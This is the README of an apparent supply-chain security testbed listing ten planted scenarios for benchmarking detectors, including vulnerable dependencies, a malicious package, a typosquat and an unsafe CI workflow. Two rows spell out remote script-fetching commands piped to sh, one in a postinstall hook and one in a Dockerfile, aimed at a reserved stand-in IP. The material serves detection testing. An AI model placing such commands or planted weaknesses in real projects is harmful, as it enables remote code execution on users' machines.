# Supply Chain Security Testbed

A controlled, minimal Node.js evaluation repository containing **10 representative supply-chain security scenarios** across dependencies, manifest integrity, container builds, and CI/CD workflows—built to benchmark detection accuracy, remediation, and AI explanation guardrails.

> **Safe for local evaluation only.** All simulated remote endpoints use RFC 5737 / RFC 2606 reserved addresses (`203.0.113.10`, `mirror.example`). Never run `npm install` on this repository without `--ignore-scripts`.

## Benchmark Scenarios (10 Checks)

| # | Category | Mistake | Expected Detection |
|---|---|---|---|
| 1 | Direct CVE | `lodash@4.17.20` in `dependencies` | OSV.dev + GitHub Advisory DB + deps.dev (`GHSA-35jh-r3h4-6jhm` / `CVE-2021-23337`, fix `4.17.21`) |
| 2 | Transitive CVE | `minimist@1.2.0` under `mkdirp@0.5.1` | OSV.dev + GitHub Advisory DB (`GHSA-xvch-5gv4-984h` / `CVE-2021-44906`, CVSS 9.8, fix `1.2.6`) |
| 3 | Malicious Package | `flatmap-stream@0.1.1` injected transitively under `express@4.17.1` | OSV.dev malware alert (`MAL-*` / `GHSA-mh6f-8j2x-4483`) + new transitive dep vs baseline |
| 4 | Typosquat + Install Script | `expresss@4.17.1` direct dep with `hasInstallScript: true` | `typosquat-rule` (imitates `express`) + `lockfile-rule LF003` |
| 5 | Dangerous Lifecycle Script | `postinstall` runs `curl -s http://203.0.113.10/setup.sh \| sh` | `manifest-rule PJ002` (CRITICAL remote code execution) |
| 6 | Integrity & Registry Tampering | `underscore@1.13.6` hash changed vs baseline + `http://mirror.example/...` | `lockfile-diff` (`DIFF-INT`) + `lockfile-rule LF001` (non-registry HTTP source) |
| 7 | Manifest Hygiene & Weak Hash | `"axios": "latest"` floating version + SHA-1 hash on `ms@2.1.2` | `manifest-rule PJ001` + `lockfile-rule LF004` |
| 8 | Dockerfile Floating/EOL Image | `FROM node:18-alpine` (EOL), `FROM node:latest`, `RUN npm install` | `Dockerfile rule DF001`, `DF003`, `DF006` |
| 9 | Dockerfile Remote Script & Root | `RUN wget -qO- http://203.0.113.10/install.sh \| sh` + no `USER` | `Dockerfile rule DF004` (CRITICAL), `DF005` |
| 10 | CI/CD Workflow Pwn-Request | `.github/workflows/release.yml` uses `pull_request_target` + PR checkout + unpinned 3rd-party action with secret + no `permissions:` | `workflow rule CI002` (CRITICAL), `CI001`, `CI005` |
